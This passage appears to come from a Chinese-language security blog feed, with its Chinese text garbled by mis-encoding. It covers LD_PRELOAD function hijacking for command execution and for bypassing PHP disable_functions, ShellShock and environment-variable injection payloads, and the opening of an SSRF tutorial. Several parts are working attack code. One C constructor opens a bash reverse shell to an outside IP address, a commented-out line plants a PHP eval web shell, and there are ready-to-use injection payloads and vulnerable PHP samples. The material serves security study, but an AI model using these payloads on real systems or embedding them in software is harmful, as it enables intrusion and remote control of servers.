class="string">&quot;id&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">strncmp</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *__s1, <span class="type">const</span> <span class="type">char</span> *__s2, <span class="type">size_t</span> __n)</span> &#123;    </span><br><span class="line">    <span class="keyword">if</span> (getenv(<span class="string">&quot;LD_PRELOAD&quot;</span>) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    unsetenv(<span class="string">&quot;LD_PRELOAD&quot;</span>);</span><br><span class="line">    payload();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå‡½æ•°çš„å®šä¹‰å¯ä»¥æ ¹æ®æŠ¥é”™ä¿¡æ¯è¿›è¡Œç¡®å®š</p><img src="E:\typora img\QQæˆªå›¾20221107134218.jpg" alt="QQæˆªå›¾20221107134218" style="zoom:67%;" /><p>ä»æºç ä¸­æ‰¾åˆ°çš„</p><img src="E:\typora img\QQæˆªå›¾20221107134226.jpg" alt="QQæˆªå›¾20221107134226" style="zoom: 67%;" /><p>ç¼–è¯‘å½¢æˆ.soæ–‡ä»¶</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gcc -shared -fPIC hook_strncmp.c -o hook_strncmp.so</span><br></pre></td></tr></table></figure><p>ç¯å¢ƒå˜é‡è®¾ç½®ä¼˜å…ˆçº§</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">export LD_PRELOAD=$PWD/hook_strncmp.so</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œå‘½ä»¤ç»“æœ</p><p><img src="/../images/image-20221107135601599-1686813288526.png" alt="image-20221107135601599"></p><h2 id="æ›´ä¸ºç®€å•çš„åŠ«æŒ"><a href="#æ›´ä¸ºç®€å•çš„åŠ«æŒ" class="headerlink" title="æ›´ä¸ºç®€å•çš„åŠ«æŒ"></a>æ›´ä¸ºç®€å•çš„åŠ«æŒ</h2><p>GCC æœ‰ä¸ª C è¯­è¨€æ‰©å±•ä¿®é¥°ç¬¦ <strong>attribute</strong>((constructor))ï¼Œå¯ä»¥è®©ç”±å®ƒä¿®é¥°çš„å‡½æ•°åœ¨ main() ä¹‹å‰æ‰§è¡Œï¼Œè‹¥å®ƒå‡ºç°åœ¨åŠ¨æ€é“¾æ¥åº“ä¸­ï¼Œé‚£ä¹ˆ<strong>ä¸€æ—¦åŠ¨æ€é“¾æ¥åº“è¢«ç³»ç»ŸåŠ è½½ï¼Œå°†ç«‹å³æ‰§è¡Œ _attribute((constructor)) ä¿®é¥°çš„å‡½æ•°</strong>ã€‚è¿™æ ·ï¼Œæˆ‘ä»¬å°±ä¸ç”¨å±€é™äºä»…åŠ«æŒæŸä¸€å‡½æ•°ï¼Œè€Œåº”è€ƒè™‘åŠ«æŒåŠ¨æ€é“¾æ¥åº“äº†ï¼Œä¹Ÿå¯ä»¥è¯´æ˜¯åŠ«æŒäº†ä¸€ä¸ªæ–°è¿›ç¨‹ã€‚</p><ul><li><p>hook.c</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">__attribute__ ((__constructor__)) <span class="type">void</span> <span class="title function_">preload</span> <span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    unsetenv(<span class="string">&quot;LD_PRELOAD&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/120.77.73.212/2333 0&gt;&amp;1&#x27;&quot;</span>);</span><br><span class="line">    <span class="comment">//system(&quot;echo \&quot;&lt;?php eval(\\$_POST[cmd]);?&gt;\&quot; &gt; /var/www/html/shell.php&quot;);</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>ç¼–è¯‘å½¢æˆ.soæ–‡ä»¶</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gcc -shared -fPIC hook.c -o hook.so</span><br></pre></td></tr></table></figure></li></ul><h2 id="PHPä¸­"><a href="#PHPä¸­" class="headerlink" title="PHPä¸­"></a>PHPä¸­</h2><ul><li>RCE</li><li>ç»•è¿‡disable_function</li></ul><h3 id="æ¡ä»¶"><a href="#æ¡ä»¶" class="headerlink" title="æ¡ä»¶"></a>æ¡ä»¶</h3><ul><li>èƒ½å¤Ÿä¸Šä¼ æ–‡ä»¶ï¼Œåªè¦æ˜¯.soæ–‡ä»¶ï¼Œä»»æ„åç¼€åéƒ½å¯ä»¥è§£æ</li><li>èƒ½å¤Ÿè®¾ç½®ç¯å¢ƒå˜é‡<code>LD_PRELOAD</code></li><li>æœ‰å¯ä»¥å¯åŠ¨æ–°è¿›ç¨‹çš„ PHP å‡½æ•°ï¼ˆè¿™æ ·æ‰èƒ½å¤ŸåŠ«æŒï¼‰</li></ul><h3 id="å¦‚ä½•æ‰¾åˆ°å¯ä»¥å¯åŠ¨æ–°è¿›ç¨‹çš„-PHP-å‡½æ•°"><a href="#å¦‚ä½•æ‰¾åˆ°å¯ä»¥å¯åŠ¨æ–°è¿›ç¨‹çš„-PHP-å‡½æ•°" class="headerlink" title="å¦‚ä½•æ‰¾åˆ°å¯ä»¥å¯åŠ¨æ–°è¿›ç¨‹çš„ PHP å‡½æ•°"></a>å¦‚ä½•æ‰¾åˆ°å¯ä»¥å¯åŠ¨æ–°è¿›ç¨‹çš„ PHP å‡½æ•°</h3><p>æŸ¥çœ‹PHPå‡½æ•°è°ƒç”¨æ—¶çš„shellæ“ä½œ</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">strace -f php test.php <span class="number">2</span>&gt;&amp;<span class="number">1</span> | grep -A2 -B2 execve</span><br></pre></td></tr></table></figure><p>test.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">mail</span>(<span class="string">&quot;a@localhost&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span>s</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20221108113210633-1686813288527.png" alt="image-20221108113210633"></p><p>å¯ä»¥çœ‹åˆ°æ‰§è¡Œmailå‡½æ•°æ—¶å®é™…æ˜¯å¯åŠ¨äº†ä¸€ä¸ªæ–°çš„è¿›ç¨‹æ¥è°ƒç”¨ç³»ç»Ÿå‘½ä»¤<code>sendmail</code></p><p>å…¶ä»–å¯ä»¥å¯åŠ¨æ–°è¿›ç¨‹çš„phpå‡½æ•°</p><ul><li><code>error_log(&quot;&quot;, 1, &quot;&quot;, &quot;&quot;);</code></li><li><code>$img = new Imagick(&#39;/tmp/a5edb30f575fb2f877a19b2f62a2e720/whoami.wmv&#39;);</code></li><li><code>system</code></li><li><code>imap_mail()</code></li><li><code>mb_send_mail()</code></li></ul><h3 id="æ–‡ä»¶ä¸Šä¼ ç»•è¿‡disable-function"><a href="#æ–‡ä»¶ä¸Šä¼ ç»•è¿‡disable-function" class="headerlink" title="æ–‡ä»¶ä¸Šä¼ ç»•è¿‡disable_function"></a>æ–‡ä»¶ä¸Šä¼ ç»•è¿‡<code>disable_function</code></h3><p><a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD">https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD</a></p><h3 id="æ— ä¸Šä¼ æ–‡ä»¶æ“ä½œâ€“ShellShockï¼ˆCVE-2014-6271ï¼‰"><a href="#æ— ä¸Šä¼ æ–‡ä»¶æ“ä½œâ€“ShellShockï¼ˆCVE-2014-6271ï¼‰" class="headerlink" title="æ— ä¸Šä¼ æ–‡ä»¶æ“ä½œâ€“ShellShockï¼ˆCVE-2014-6271ï¼‰"></a>æ— ä¸Šä¼ æ–‡ä»¶æ“ä½œâ€“ShellShockï¼ˆCVE-2014-6271ï¼‰</h3><p>ä»¥ä¸‹æµ‹è¯•ç¯å¢ƒ</p><p><img src="/../images/image-20221126164918984-1686813288527.png" alt="image-20221126164918984"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;envs&#x27;</span>] <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$val</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">putenv</span>(<span class="string">&quot;<span class="subst">&#123;$key&#125;</span>=<span class="subst">&#123;$val&#125;</span>&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//... ä¸€äº›å…¶ä»–ä»£ç </span></span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&#x27;echo hello&#x27;</span>); <span class="comment"># ç›¸å½“äºsh -c echo &quot;command&quot;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h4><p>åªé€‚ç”¨äºredhatç³»åˆ—â€“centos</p><blockquote><p>redhatç³»åˆ—shæŒ‡å‘bash</p><p><img src="/../images/image-20221126161815577-1686813288527.png" alt="image-20221126161815577"></p></blockquote><blockquote><p>debianç³»åˆ—æŒ‡å‘dash</p><p><img src="/../images/image-20221126163241501-1686813288527.png" alt="image-20221126163241501"></p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Bashæ²¡æœ‰ä¿®å¤ShellShockæ¼æ´ï¼šç›´æ¥ä½¿ç”¨ShellShockçš„POCè¿›è¡Œæµ‹è¯•ï¼Œä¾‹å¦‚TEST=&#x27;() &#123; :; &#125;&#x27;; id;</span><br><span class="line"></span><br><span class="line">Bash 4.4ä»¥å‰ï¼šenv $&#x27;BASH_FUNC_echo()=() &#123; id; &#125;&#x27; bash -c &quot;echo hello&quot;</span><br><span class="line"></span><br><span class="line">Bash 4.4åŠä»¥ä¸Šï¼šenv $&#x27;BASH_FUNC_echo%%=() &#123; id; &#125;&#x27; bash -c &#x27;echo hello&#x27;</span><br></pre></td></tr></table></figure><p>æœ¬åœ°æµ‹è¯•</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># system(&#x27;echo hello&#x27;); # ç›¸å½“äºsh -c echo &quot;command&quot;</span></span><br><span class="line">?envs[<span class="title function_ invoke__">BASH_FUNC_echo</span>()]=() &#123; ls; &#125;</span><br></pre></td></tr></table></figure><img src="E:\typora img\image-20221126170554976.png" alt="image-20221126170554976" style="zoom:50%;" /><h4 id="å…¶ä»–æƒ…å†µä¸‹çš„ç¯å¢ƒå˜é‡æ³¨å…¥payload"><a href="#å…¶ä»–æƒ…å†µä¸‹çš„ç¯å¢ƒå˜é‡æ³¨å…¥payload" class="headerlink" title="å…¶ä»–æƒ…å†µä¸‹çš„ç¯å¢ƒå˜é‡æ³¨å…¥payload"></a>å…¶ä»–æƒ…å†µä¸‹çš„ç¯å¢ƒå˜é‡æ³¨å…¥payload</h4><h5 id="redhat"><a href="#redhat" class="headerlink" title="redhat"></a>redhat</h5><ul><li><p><code>PROMPT_COMMAND</code>ï¼šå¯ä»¥åœ¨<code>bash</code>äº¤äº’å¼ç¯å¢ƒä¸‹æ‰§è¡Œä»»æ„å‘½ä»¤</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">PROMPT_COMMAND=&#x27;id&#x27; bash</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20221126162222851-1686813288528.png" alt="image-20221126162222851"></p></li></ul><h5 id="é€šç”¨"><a href="#é€šç”¨" class="headerlink" title="é€šç”¨"></a>é€šç”¨</h5><ul><li><code>ENV</code>ï¼šå¯ä»¥åœ¨<code>sh -i -c</code>çš„æ—¶å€™æ³¨å…¥ä»»æ„å‘½ä»¤</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ENV=&#x27;$(id 1&gt;&amp;2)&#x27; sh -i -c &quot;echo hello&quot;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20221126162443791-1686813288528.png" alt="image-20221126162443791"></p><p><img src="/../images/image-20221126162453087-1686813288528.png" alt="image-20221126162453087"></p><ul><li><p><code>BASH_ENV</code>ï¼šå¯ä»¥åœ¨<code>bash -c</code>çš„æ—¶å€™æ³¨å…¥ä»»æ„å‘½ä»¤</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">BASH_ENV=&#x27;$(id 1&gt;&amp;2)&#x27; bash -c &#x27;echo hello&#x27;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20221126162613165-1686813288528.png" alt="image-20221126162613165"></p></li></ul><p><img src="/../images/image-20221126162622468-1686813288528.png" alt="image-20221126162622468"></p><ul><li><p><code>PS1</code>ï¼šå¯ä»¥åœ¨<code>dash</code>æˆ–<code>bash</code>äº¤äº’å¼ç¯å¢ƒä¸‹æ‰§è¡Œä»»æ„å‘½ä»¤</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">PS1=&#x27;$(whoami)&#x27; dash/bash</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20221126163037850-1686813288528.png" alt="image-20221126163037850"></p></li></ul><p><img src="/../images/image-20221126163059160-1686813288528.png" alt="image-20221126163059160"></p><h4 id="å¤ç°"><a href="#å¤ç°" class="headerlink" title="å¤ç°"></a>å¤ç°</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&#x27;command&#x27;</span>) ----&gt;  <span class="title function_ invoke__">php_exec_ex</span>() ----&gt;   <span class="title function_ invoke__">php_exec</span>()  ---&gt;   linux popenå‡½æ•°  ---&gt;</span><br><span class="line">Linux glibcåº“    ----&gt;   sh -c <span class="keyword">echo</span> <span class="string">&quot;command&quot;</span>  </span><br></pre></td></tr></table></figure><blockquote><p>glibcæ˜¯gnuå‘å¸ƒçš„libcåº“ï¼Œä¹Ÿå³cè¿è¡Œåº“ã€‚glibcæ˜¯linux ç³»ç»Ÿä¸­æœ€åº•å±‚çš„apiï¼ˆåº”ç”¨ç¨‹åºå¼€å‘æ¥å£ï¼‰ï¼Œå‡ ä¹å…¶å®ƒä»»ä½•çš„è¿è¡Œåº“éƒ½ä¼šå€šèµ–äºglibcã€‚</p></blockquote><img src="E:\typora img\image-20221107153339706.png" alt="image-20221107153339706" style="zoom:67%;" /><img src="E:\typora img\image-20221107153422836.png" alt="image-20221107153422836" style="zoom:67%;" /><img src="E:\typora img\image-20221107153502513.png" alt="image-20221107153502513" style="zoom:67%;" /><img src="E:\typora img\image-20221107153708100.png" alt="image-20221107153708100" style="zoom:67%;" /><h5 id="debianç³»åˆ—"><a href="#debianç³»åˆ—" class="headerlink" title="debianç³»åˆ—"></a>debianç³»åˆ—</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sh -c echo &quot;command&quot;  --&gt; dash -c echo &quot;command&quot;   #  åœ¨debianç³»åˆ—shæŒ‡å‘dash</span><br></pre></td></tr></table></figure><p>æ¼æ´äº§ç”ŸåŸå› </p><p>åœ¨dashæºç ä¸­</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (</span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> linux</span></span><br><span class="line">getuid( ) == geteuid( ) &amp;&amp; getgid( ) == getegid( ) S &amp;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">iflag ï¼‰&#123;  <span class="comment">// iflagä¸º-iå‚æ•°ï¼Œæ‰€ä»¥åªæœ‰ä¼ å…¥-iå‚æ•°æ‰èƒ½è¿›å…¥ä¸‹é¢çš„ifè¯­å¥</span></span><br><span class="line"><span class="keyword">if</span> ((shinit = lookupvar(<span class="string">&quot;ENV&quot;</span>)) != <span class="literal">NULL</span> &amp;&amp; *shinit != <span class="string">&#x27;\0&#x27;</span>) </span><br><span class="line">    &#123;</span><br><span class="line">    read_profile(shinit);</span><br><span class="line">&#125;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>read_profile</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">STATIC <span class="type">void</span></span><br><span class="line"><span class="title function_">read_profile</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *name)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// expandstrå¯ä»¥è§£æshellå‘½ä»¤ï¼Œè§£æçš„nameå‚æ•°å°±æ˜¯ç¯å¢ƒå˜é‡ENV</span></span><br><span class="line">    name = expandstr(name);</span><br><span class="line">    <span class="keyword">if</span> (setinputfile(name, INPUT_PUSH_FILE | INPUT_NOFILE_OK) &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    cmdloop(<span class="number">0</span>);</span><br><span class="line">    popfile();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ENV=&#x27;$(id 1&gt;&amp;2)&#x27; dash -i -c &#x27;echo hello&#x27;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20221107152419461-1686813288528.png" alt="image-20221107152419461"></p><h1 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h1><p><a href="https://www.anquanke.com/post/id/254388#h3-6">https://www.anquanke.com/post/id/254388#h3-6</a></p><p><a href="https://www.leavesongs.com/PENETRATION/how-I-hack-bash-through-environment-injection.html">https://www.leavesongs.com/PENETRATION/how-I-hack-bash-through-environment-injection.html</a></p>]]></content>
      
      
      <categories>
          
          <category> æ¸—é€æµ‹è¯• </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>SSRF</title>
      <link href="/2023/05/31/Web%E5%AE%89%E5%85%A8%E4%B9%8BSSRF/"/>
      <url>/2023/05/31/Web%E5%AE%89%E5%85%A8%E4%B9%8BSSRF/</url>
      
        <content type="html"><![CDATA[<h1 id="æ¦‚è¿°"><a href="#æ¦‚è¿°" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h1><p><code>SSRF</code>ï¼ˆServer-Side Request Forgeryï¼ŒæœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ ï¼‰æ˜¯ä¸€ç§<strong>ç”±æ”»å‡»è€…æ„é€ è¯·æ±‚ï¼Œåˆ©ç”¨æœåŠ¡å™¨ç«¯å‘èµ·è¯·æ±‚</strong>çš„å®‰å…¨æ¼æ´ã€‚ä¸€èˆ¬æƒ…å†µä¸‹ï¼ŒSSRFæ”»å‡»çš„ç›®æ ‡æ˜¯å¤–ç½‘æ— æ³•è®¿é—®çš„å†…éƒ¨ç³»ç»Ÿï¼ˆæ­£å› ä¸ºè¯·æ±‚æ˜¯ç”±æœåŠ¡å™¨ç«¯å‘èµ·çš„ï¼Œæ‰€ä»¥æœåŠ¡å™¨èƒ½è¯·æ±‚åˆ°ä¸è‡ªèº«ç›¸è¿è€Œå¤–ç½‘éš”ç¦»çš„å†…éƒ¨ç³»ç»Ÿï¼‰ã€‚</p><p>â€‹ </p><h1 id="æ¼æ´æˆå› "><a href="#æ¼æ´æˆå› " class="headerlink" title="æ¼æ´æˆå› "></a>æ¼æ´æˆå› </h1><p>ç›®æ ‡æœåŠ¡å™¨ä¼šä»è‡ªèº«å‘èµ·è¯·æ±‚ï¼Œå¹¶ä¸”è¯¥è¯·æ±‚å¯æ§ä»¥åŠæ²¡æœ‰å¯¹è¯·æ±‚åœ°å€è¿›è¡Œè¿‡æ»¤å’Œé™åˆ¶ã€‚</p><h1 id="å¸¸è§åœºæ™¯"><a href="#å¸¸è§åœºæ™¯" class="headerlink" title="å¸¸è§åœºæ™¯"></a>å¸¸è§åœºæ™¯</h1><ul><li><p>è¯·æ±‚å¤–éƒ¨èµ„æºï¼Œå¦‚å¯¼å…¥æ–‡ä»¶ï¼ŒåŠ è½½è¿œç¨‹å›¾ç‰‡ï¼ŒRSSè®¢é˜…ç­‰</p></li><li><p>æ•°æ®åº“å†…ç½®çš„åŠ è½½å¤–éƒ¨URLåŠŸèƒ½</p></li><li><p>Webmailæ”¶å–å…¶ä»–é‚®ç®±é‚®ä»¶ï¼Œå¦‚POP3,IMAP,SMTPç­‰</p></li><li><p>æ–‡ä»¶å¤„ç†ï¼Œç¼–ç å¤„ç†ï¼Œå±æ€§ä¿¡æ¯å¤„ç†ï¼Œå¦‚FFmpegï¼ŒImageMagic,Word,Excel,PDF,XMLç­‰</p><p><a href="https://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2016-0205699">56è§†é¢‘FFmpegè§£ææ¼æ´å¯¼è‡´SSRF | wooyun-2016-0205699| WooYun.org</a></p></li></ul><h1 id="æ¼æ´å±å®³"><a href="#æ¼æ´å±å®³" class="headerlink" title="æ¼æ´å±å®³"></a>æ¼æ´å±å®³</h1><ul><li>è¯»å–æ–‡ä»¶</li><li>å†…ç½‘æ¢é’ˆï¼Œè·å–å†…ç½‘ç»“æ„å’Œå†…ç½‘æœºå™¨æŒ‡çº¹</li><li>è‹¥å†…ç½‘ä¸»æœºå­˜åœ¨æ¼æ´ï¼Œå¯ä»¥ä½¿ç”¨gopheråè®®æ„é€ æ•°æ®åŒ…å¯¹å…¶å‘èµ·æ”»å‡»</li></ul><p>From å›½å…‰å¸ˆå‚…çš„ssrfé¶åœºæ‹“æ‰‘å›¾</p><p><img src="/../images/16205694239190.png" alt="img"></p><blockquote><p>172.72.23.21 è¿™ä¸ªæœåŠ¡å™¨çš„ Web 80 ç«¯å£å­˜åœ¨ SSRF æ¼æ´ï¼Œå¹¶ä¸” 80 ç«¯å£æ˜ å°„åˆ°äº†å…¬ç½‘çš„ 8080ï¼Œæ­¤æ—¶æ”»å‡»è€…é€šè¿‡è¿™ä¸ª 8080 ç«¯å£å¯ä»¥å€ŸåŠ© SSRF æ¼æ´å‘èµ·å¯¹ 172 ç›®æ ‡å†…ç½‘çš„æ¢æµ‹å’Œæ”»å‡»ã€‚</p></blockquote><h1 id="äº§ç”Ÿæ¼æ´çš„å‡½æ•°"><a href="#äº§ç”Ÿæ¼æ´çš„å‡½æ•°" class="headerlink" title="äº§ç”Ÿæ¼æ´çš„å‡½æ•°"></a>äº§ç”Ÿæ¼æ´çš„å‡½æ•°</h1><ul><li><p><code>file_get_contents</code></p><blockquote><p>å°†æ•´ä¸ªæ–‡ä»¶è¯»å…¥ä¸€ä¸ªå­—ç¬¦ä¸²</p><p>æ”¯æŒæœ¬åœ°æ–‡ä»¶å’Œè¿œç¨‹æ–‡ä»¶</p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20220804190900308.png" alt="image-20220804190900308"></p></li><li><p><code>curl_exec()</code></p><blockquote><p>æ‰§è¡Œç»™å®šçš„ curl ä¼šè¯ã€‚</p><p><a href="https://stackoverflow.com/questions/6382539/call-to-undefined-function-curl-init">Call to undefined function curl_init()é”™è¯¯è§£å†³</a></p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">curl</span>(<span class="params"><span class="variable">$url</span></span>)</span>&#123;  </span><br><span class="line">    <span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">curl</span>(<span class="variable">$url</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20220804191212091.png" alt="image-20220804191212091"></p></li><li><p><code>fsockopen</code></p><blockquote><p>ä½¿ç”¨socketè·ŸæœåŠ¡å™¨å»ºç«‹tcpè¿æ¥ï¼Œä¼ è¾“åŸå§‹æ•°æ®ã€‚</p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">GetFile</span>(<span class="params"><span class="variable">$host</span>,<span class="variable">$port</span>,<span class="variable">$data</span></span>) </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">    <span class="variable">$fp</span> = <span class="title function_ invoke__">fsockopen</span>(<span class="variable">$host</span>, <span class="title function_ invoke__">intval</span>(<span class="variable">$port</span>), <span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="number">30</span>); </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$fp</span>) </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$errstr</span> (error number <span class="subst">$errno</span>) \n&quot;</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">    &#123; </span><br><span class="line">        </span><br><span class="line">        <span class="comment">//$fp:TCPè¿æ¥  $data:è¯·æ±‚å¤´</span></span><br><span class="line">        <span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>, <span class="title function_ invoke__">base6e_decode</span>(<span class="variable">$data</span>));</span><br><span class="line">        </span><br><span class="line">        <span class="variable">$contents</span>=<span class="string">&#x27;&#x27;</span>; </span><br><span class="line">        <span class="comment">//æ‰§è¡Œhttpè¯·æ±‚ï¼Œå¹¶è·å¾—è¿”å›å€¼</span></span><br><span class="line">        <span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$fp</span>)) </span><br><span class="line">        &#123; </span><br><span class="line">            <span class="variable">$contents</span>.= <span class="title function_ invoke__">fgets</span>(<span class="variable">$fp</span>, <span class="number">1024</span>); </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>); </span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$contents</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$content</span>=<span class="title function_ invoke__">GetFile</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;host&#x27;</span>],<span class="variable">$_GET</span>[<span class="string">&#x27;port&#x27;</span>],<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$content</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?host=<span class="number">127.0</span>.<span class="number">0.1</span>&amp;port=<span class="number">80</span>&amp;data=R0VUIC9mbGFnLnBocCBIVFRQLzEuMQ0KSG9zdDogMTI3LjAuMC4xDQpDb25uZWN0aW9uOiBDbG9zZQ0KDQo</span><br><span class="line"></span><br><span class="line">data--&gt;</span><br><span class="line">GET /flag.php HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line">Connection: Close</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20220804191713087.png" alt="image-20220804191713087"></p></li></ul><h1 id="æ”»å‡»æµç¨‹"><a href="#æ”»å‡»æµç¨‹" class="headerlink" title="æ”»å‡»æµç¨‹"></a>æ”»å‡»æµç¨‹</h1><p>æ£€æµ‹åˆ°å­˜åœ¨SSRFæ¼æ´å</p><ul><li>æ¢æµ‹ä¸»æœºå­˜æ´»æƒ…å†µ</li><li>æ¢æµ‹å­˜æ´»ä¸»æœºç«¯å£æƒ…å†µ</li><li>æ ¹æ®ç«¯å£æƒ…å†µå°è¯•æ”»å‡»</li></ul><p><strong>æ³¨æ„ç‚¹</strong></p><p>æ”»å‡»çš„æ•°æ®éœ€è¦ç»è¿‡ä¸¤æ¬¡URLç¼–ç ï¼Œå› ä¸ºæ•°æ®æ˜¯å…ˆåˆ°è¾¾æœ‰SSRFæ¼æ´çš„ä¸»æœºï¼Œå†é€šè¿‡SSRFæ¼æ´è½¬äº¤ç»™å†…ç½‘å…¶ä»–ä¸»æœºå¤„ç†ã€‚</p><h1 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h1><h2 id="å¸¸ç”¨åè®®ä»‹ç»"><a href="#å¸¸ç”¨åè®®ä»‹ç»" class="headerlink" title="å¸¸ç”¨åè®®ä»‹ç»"></a>å¸¸ç”¨åè®®ä»‹ç»</h2><h3 id="curl"><a 